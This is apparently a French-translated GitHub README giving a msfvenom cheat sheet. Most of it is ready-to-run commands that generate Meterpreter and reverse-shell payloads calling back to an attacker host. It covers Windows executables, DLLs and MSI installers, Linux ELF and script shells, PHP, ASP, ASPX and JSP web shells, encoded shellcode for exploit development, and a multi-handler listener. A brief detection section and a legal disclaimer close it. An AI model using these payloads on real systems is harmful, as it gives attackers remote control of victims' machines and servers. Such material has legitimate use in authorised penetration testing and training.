<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💣 Msfvenom - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```
<p align="center">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Charges utiles">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Formats">
</p>

<p align="center">
  <b>💣 Aide-mémoire principal pour générer des charges utiles, des shellcodes et des portes dérobées autonomes sur les plates-formes Windows, Linux, macOS, Android et Web</b>
</p>

---

## 📋 Table des matières

- [Présentation et architecture de charge utile](#-overview--payload-architecture)
  - [Charges utiles avec ou sans étape](#charges utiles avec ou sans étape)
- [Drapeaux et options essentiels](#-essential-flags--options)
- [Charges utiles Windows (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
- [Charges utiles Linux et Unix (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
- [Charges utiles Web et Web Shell (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
-[Génération de Shellcode pour le développement d'exploits (C, Raw, Python)](#-shellcode-generation-for-exploit-development-c-raw-python)
  - [Suppression des mauvais caractères (`-b`)](#stripping-bad-characters--b)
  -[Encodeurs et itérations multiples (`-e`, `-i`)](#encoders--multiple-iterations--e--i)
-[Configuration rapide de Metasploit Multi-Handler](#-metasploit-multi-handler-quick-setup)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et détection](#-considérations-defensives--détection)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et architecture de charge utile

Combinant les utilitaires classiques `msfpayload` et `msfencode`, **msfvenom** génère des exécutables binaires, des scripts et du shellcode brut pour les tests d'exploitation et de pénétration.

### Charges utiles avec ou sans étape
- **Mise en scène (par exemple `windows/x64/meterpreter/reverse_tcp`) :**
  Utilise des barres obliques entre les composants. Un petit stub (étape 0) se reconnecte à l'auditeur et récupère la DLL de réflexion complète (étape 1) en mémoire. Idéal pour les exploits avec des limites strictes de longueur de tampon.
- **Sans étage (par exemple `windows/x64/meterpreter_reverse_tcp`) :**
  Utilise un trait de soulignement (`_`). L’intégralité de la charge utile de Meterpreter est autonome dans l’exécutable ou le shellcode. Fonctionne de manière fiable sans dépendre de poignées de main réseau à plusieurs étapes, ce qui le rend idéal pour les exécuteurs de ligne de commande et la persistance évasive.

---

## ⚙️ Drapeaux et options essentiels
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
| Drapeau | Descriptif |
|------|-------------|
| `-p, --payload` | Spécifie la charge utile à utiliser (`--list payloads` pour tout afficher). |
| `-f, --format` | Format de sortie (exe, elf, raw, c, python, asp, aspx, war, php). |
| `-e, --encoder` | Encodeur Shellcode pour éliminer les mauvais caractères (`--list encoders`). |
| `-i, --iterations` | Nombre de passes d'encodage. |
| `-b, --bad-chars` | Caractères à éviter dans le shellcode (par exemple, `\x00\x0a\x0d`). |
| `-x, --template` | Modèle exécutable dans lequel injecter la charge utile. |
| `-k, --keep` | Préserve l'exécution normale du modèle dans un nouveau thread. |
| `-o, --out` | Chemin du fichier de destination de sortie. |

---

## 🪟 Charges utiles Windows (EXE, DLL, MSI, PowerShell)

### Exécutable Shell inversé Windows x64 (sans étape)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
### Exécutable TCP inversé par étapes Windows x64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```
### Charge utile d'injection de DLL Windows
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```
### Programme d'installation Windows MSI (augmentation des privilèges via AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```
### Commande PowerShell codée en base64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```
---

## 🐧 Charges utiles Linux et Unix (ELF, Python, Bash)

### Linux x64 ELF binaire (sans étape)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```
### Linux Standard `/bin/sh` Reverse TCP (pas de Meterpreter)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```
### Script Shell inversé Python autonome
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```
### Chaîne de commande Pure Bash
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```
---

## 🌐 Charges utiles Web et Web Shell (PHP, ASP, ASPX, JSP, WAR)

### PHP Reverse Meterpreter Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```
### ASP et ASPX classiques (serveurs IIS)
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```
### Package Java WAR (archives Web Apache Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```
---

## 🔬 Génération de Shellcode pour le développement d'exploits (C, Raw, Python)

### Suppression des mauvais caractères (`-b`)
Les octets nuls (`\x00`), les retours chariot (`\r` = `\x0d`) et les nouvelles lignes (`\n` = `\x0a`) interrompent les exploits de corruption de mémoire basés sur les chaînes (par exemple, les débordements de pile) :
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```
### Encodeurs et itérations multiples (`-e`, `-i`)
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```
---

## 🎧 Configuration rapide du multi-gestionnaire Metasploit

Capturez toujours les charges utiles à l'aide du `multi/handler` de Metasploit :
```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```
---

## ⚡ Tableau de référence rapide

| Plateforme cible | Commande |
|-----------------|---------|
| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **Coque Web PHP** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **Guerre Tomcat** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **Shellcode brut (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ Considérations défensives et détection

1. **Détection de signature statique :** Les modèles et encodeurs Msfvenom par défaut (`shikata_ga_nai`) ont des signatures statiques bien connues identifiées par pratiquement tous les moteurs antivirus modernes.
2. **Surveillance EDR comportementale :** Les agents EDR signalent l'apparition d'un processus anormal (par exemple, `cmd.exe` ou `powershell.exe` générés sous `w3wp.exe` ou `tomcat8.exe`).

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Msfvenom génère des charges utiles offensives fonctionnelles et des portes dérobées. Il doit être strictement utilisé lors de tests d’intrusion autorisés et dans des environnements de recherche en laboratoire isolés. La génération ou l’exécution non autorisée sur des ordinateurs tiers est illégale.